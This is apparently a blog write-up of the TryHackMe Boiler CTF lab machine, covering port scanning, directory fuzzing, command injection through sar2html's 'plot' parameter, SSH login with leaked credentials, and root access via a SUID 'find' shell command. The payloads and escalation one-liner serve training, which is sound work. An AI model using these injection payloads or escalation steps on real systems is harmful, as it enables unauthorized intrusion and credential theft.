---
layout: post
title: THM Boiler CTF WriteUp
date: 2025-03-13
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - Linux
  - Web-Fuzzing
  - Joomla-Exploitation
  - sar2html
  - Command-Injection
  - SSH
  - Credentials-Leakage
  - SUID-Exploitation
  - Privilege-Escalation
media_subpath: /assets/img/BoilerCTF
---
![Desktop View](BoilerCTF.jpeg){: w="400"  h="400" }

# Boiler CTF Skills


>**Boiler CTF** is a Medium Linux machine where we will use the following skills:

- **Port Discovery**  
- **Web Application Enumeration**  
- **Directory and File Fuzzing**  
- **Joomla Enumeration**  
- **Exploiting Command Injection in sar2html (plot parameter)**  
- **Reading Sensitive Files via Command Injection**  
- **SSH Login with Discovered Credentials**  
- **Linux Privilege Enumeration**  
- **Credential Discovery for User stoner**  
- **Exploiting SUID Binary (find)**  
- **Privilege Escalation via SUID Exploitation**  

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **21, 80, 10000** & port **55007**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.12.1 -oG allPorts
Nmap scan report for 10.10.12.1
Host is up, received user-set (1.3s latency).
Scanned at 2025-03-13 16:55:17 CET for 29s
Not shown: 49967 closed tcp ports (reset), 15564 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 63
80/tcp    open  http             syn-ack ttl 63
10000/tcp open  snet-sensor-mgmt syn-ack ttl 63
55007/tcp open  unknown          syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p21,80,10000,55007 10.10.12.1 -oN targeted
Nmap scan report for 10.10.12.1
Host is up (0.11s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.99.119
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel```

So we have to check the following ports & services:

- **Port  21 -->  vsftpd 3.0.3**
- **Port 80 -->  Apache httpd 2.4.18 ((Ubuntu))**
- **Port 10000 --> MiniServ 1.930 (Webmin httpd)**
- **Port 55007 --> OpenSSH 7.2p2 Ubuntu 4ubuntu2.8**

Let's start with the **FTP** service.

---
## Port 21 Enumeration

Checking the `nmap` report, we can see that the `anonymous` user is allowed, so let's check what we can find inside.

```bash
❯ ftp 10.10.12.1
Connected to 10.10.12.1.
220 (vsFTPd 3.0.3)
Name (10.10.12.1:ne4rby): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
ftp> ls -la
229 Entering Extended Passive Mode (|||44852|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
```

There is one hidden file named `.info.txt`, let's download it.

```bash
ftp> get .info.txt
local: .info.txt remote: .info.txt
229 Entering Extended Passive Mode (|||41348|)
150 Opening BINARY mode data connection for .info.txt (74 bytes).
100% |*********************************************************************************************************************************************|    74      850.18 KiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (0.77 KiB/s)
ftp> exit
221 Goodbye.
```

Once with the file downloaded, let's check it's content.

```bash
❯ catn .info.txt
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

Seems like a **ROT13** cipher, let's decode it's content, i do have an alias defined in my `.zshrc` but you can use any online tool: [https://dnschecker.org/rot13-decoder-encoder.php](https://dnschecker.org/rot13-decoder-encoder.php)

If you want the alias just copy this line wherever you want in your `.bashrc`: `alias rot13="tr 'A-Za-z' 'N-ZA-Mn-za-m'"`.

```bash
❯ cat .info.txt | rot13
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

Rabbit hole found, let's continue with the **HTTP** service.

---
## Port 80 Enumeration

Checking the `nmap` report, the website seems like  a default **Apache** page, let's check it.

![Desktop View](BoilerCTFMainPage.png)

As expected, so let's fuzz in order to find subdirectories.

```bash
❯ gobuster dir -u http://10.10.12.1 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.12.1
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 294]
/.htpasswd            (Status: 403) [Size: 294]
/joomla               (Status: 301) [Size: 309] [--> http://10.10.12.1/joomla/]
/manual               (Status: 301) [Size: 309] [--> http://10.10.12.1/manual/]
/robots.txt           (Status: 200) [Size: 257]
/server-status        (Status: 403) [Size: 298]
Progress: 20478 / 20479 (100.00%)
===============================================================
Finished
===============================================================
```

We found a `/joomla` directory, so we expect a **Joomla CMS** installation, let's check it via browser.

![Desktop View](BoilerCTFJoomlaMainPage.png)

Once inside, we can see a basic blog, let's check the **Joomla version**, we can do that accessing the following path: `/administrator/manifests/files/joomla.xml`

![Desktop View](BoilerCTFJoomlaVersion.png)

So we are facing a **3.9.13-dev** version of **Joomla**, let's see if there is any publicly available exploit.

```bash
❯ searchsploit joomla 3.9.12
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                                                           | php/webapps/43488.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Nothing found, since the only exploit found is for a component, so let's fuzz the `/joomla` directory.

```bash
❯ gobuster dir -u http://10.10.12.1/joomla -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.12.1/joomla
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 301]
/.htpasswd            (Status: 403) [Size: 301]
/_archive             (Status: 301) [Size: 318] [--> http://10.10.12.1/joomla/_archive/]
/_database            (Status: 301) [Size: 319] [--> http://10.10.12.1/joomla/_database/]
/_files               (Status: 301) [Size: 316] [--> http://10.10.12.1/joomla/_files/]
/_test                (Status: 301) [Size: 315] [--> http://10.10.12.1/joomla/_test/]
/administrator        (Status: 301) [Size: 323] [--> http://10.10.12.1/joomla/administrator/]
/bin                  (Status: 301) [Size: 313] [--> http://10.10.12.1/joomla/bin/]
/build                (Status: 301) [Size: 315] [--> http://10.10.12.1/joomla/build/]
/cache                (Status: 301) [Size: 315] [--> http://10.10.12.1/joomla/cache/]
/cli                  (Status: 301) [Size: 313] [--> http://10.10.12.1/joomla/cli/]
/components           (Status: 301) [Size: 320] [--> http://10.10.12.1/joomla/components/]
/images               (Status: 301) [Size: 316] [--> http://10.10.12.1/joomla/images/]
/includes             (Status: 301) [Size: 318] [--> http://10.10.12.1/joomla/includes/]
/installation         (Status: 301) [Size: 322] [--> http://10.10.12.1/joomla/installation/]
/language             (Status: 301) [Size: 318] [--> http://10.10.12.1/joomla/language/]
/layouts              (Status: 301) [Size: 317] [--> http://10.10.12.1/joomla/layouts/]
/libraries            (Status: 301) [Size: 319] [--> http://10.10.12.1/joomla/libraries/]
/media                (Status: 301) [Size: 315] [--> http://10.10.12.1/joomla/media/]
/modules              (Status: 301) [Size: 317] [--> http://10.10.12.1/joomla/modules/]
/plugins              (Status: 301) [Size: 317] [--> http://10.10.12.1/joomla/plugins/]
/templates            (Status: 301) [Size: 319] [--> http://10.10.12.1/joomla/templates/]
/tests                (Status: 301) [Size: 315] [--> http://10.10.12.1/joomla/tests/]
/tmp                  (Status: 301) [Size: 313] [--> http://10.10.12.1/joomla/tmp/]
/~www                 (Status: 301) [Size: 314] [--> http://10.10.12.1/joomla/~www/]

===============================================================
Finished
===============================================================
```

We have found a big amount of subdirectories, so let's check them one by one.

- Starting with the `/_archive` directory, where we just see a header telling us: `Mnope, nothin to see.`.

![Desktop View](BoilerCTF_archive.png)

- Checking the `/database` directory, we found another header that look coded as **ROT13**, but trying to decode it, it did not work, after a bit of research i found that is coded as **ROT24**.

![Desktop View](BoilerCTF_database.png)

So let's decode it using a online tool.

![Desktop View](BoilerCTF_databaseDecode.png)

- Checking the `/files` directory, we found another header that look coded as `base64`, so let's decode it.

![Desktop View](BoilerCTF_files.png)

```bash
❯ echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d
V2hvcHNpZSBkYWlzeQo=
❯ echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d | base64 -d
Whopsie daisy
```

it was coded two times, the machine owner is just messing with us, but let's continue.

- Checking the `/test` directory we finally found something else, we can see a `sar2html` tool working, I was not familiar with this tool, but after googling it, i found that it's a statistic tool.

![Desktop View](BoilerCTF_test.png)

Checking for any publicly available exploit for this technology.

```bash
❯ searchsploit sar2html
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Execution                                                                                                           | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution                                                                                                               | php/webapps/47204.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

We found one vulnerability, checking a bit how it works, we can see that the parameter `plot` is vulnerable to **command injection**, we can inject a command and see the output in the *Select Host* button.

We can inject the command `id`, using the following payload.

```bash
http://10.10.12.1/joomla/_test/index.php?plot=; id
```

After executing we can see the output in the *Select Option*.

![Desktop View](BoilerCTFRCEOutput.png)

I don't know why, but i was not capable to gain a reverse shell, so checking if we can read any sensitive file i found a file named `log.txt`.

```bash
http://10.10.12.1/joomla/_test/index.php?plot=; ls
```

![Desktop View](BoilerCTFListing.png)

Checking it's content, we can what looks like a `ssh` authentication log where we found credentials for the user `basterd`.

```bash
http://10.10.12.1/joomla/_test/index.php?plot=; cat log.txt
```

![Desktop View](BoilerCTFLog.png)

So, we now own credentials for the user `basterd`, since `ssh` is active at port **55007**, let's try to log in.

```bash
❯ ssh basterd@10.10.12.1 -p 55007
basterd@10.10.12.1's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.


Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
$ whoami
basterd
```

## Shell as Basterd

Now we can begin with the **privilege escalation** phase, looking for the `user.txt` flag, i found a bash script named `backup.sh` located at the `basterd` home directory: `/home/basterd/backup.sh`.

If we check it's content we found credentials for the user `stoner`.

```bash
$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#su****uperp@******nows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
	    echo "Begining copy of" $i  >> $LOG
	    scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
	    echo $i "completed" >> $LOG
		
		if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
		   rm $SOURCE/$i
		   echo $i "removed" >> $LOG
		   echo "####################" >> $LOG
				else
					echo "Copy not complete" >> $LOG
					exit 0
		fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```

Once with the credentials found, we can get a shell as `stoner`.

```bash
$ su stoner 
Password: 
stoner@Vulnerable:/home/basterd$ whoami
stoner
```

## Shell as Stoner

Once as `stoner`, we can read the `user.txt` flag, located at `/home/stoner/.secret`.

```bash
stoner@Vulnerable:~$ cat /home/stoner/.secret 
You **** ** till ****, **** done.
```

Checking for `sudoers` privileges we found something, but it's the owner of the machine messing with us again :).

```bash
stoner@Vulnerable:~$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

So let's keep enumerating, checking for `SUID` binaries, we found that we can execute the `find` binary as `root`.

```bash
stoner@Vulnerable:~$ find / -perm -4000 2>/dev/null

<REDACTED>

/usr/bin/find

<REDACTED>
```

Checking the `find` binary at [GTFOBins](https://gtfobins.github.io/gtfobins/find/#suid) we can gain privileges with the next command.

```bash
stoner@Vulnerable:~$ find . -exec /bin/bash -p \; -quit  
bash-4.3# whoami
root
```

Once as `root` we can read the `root.txt` flag, located at `/root/root.txt`.

```bash
bash-4.3# cat /root/root.txt 
It ****'* that ****, *** it?
```

---
## Final Thoughts

The **Boiler CTF** machine on TryHackMe is a fantastic challenge that emphasizes **web application enumeration**, **command injection**, and **privilege escalation**. The initial phase involves using **fuzzing** to uncover a **Joomla installation** and a vulnerable instance of the **sar2html tool** located in the `/_test` subdirectory. Exploiting the **command injection vulnerability** in the `plot` parameter allows for reading sensitive files, such as `log.txt`, which contains credentials for SSH access. This highlights the importance of securing web applications and validating user inputs. The privilege escalation phase involves discovering credentials for the user **stoner** and exploiting the **SUID bit** on the **find** binary to gain root access. This machine effectively reinforces skills in **web fuzzing**, **command injection**, **credential discovery**, and **SUID exploitation**, making it a valuable exercise for aspiring penetration testers.

---

![Desktop View](BoilerCTFPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

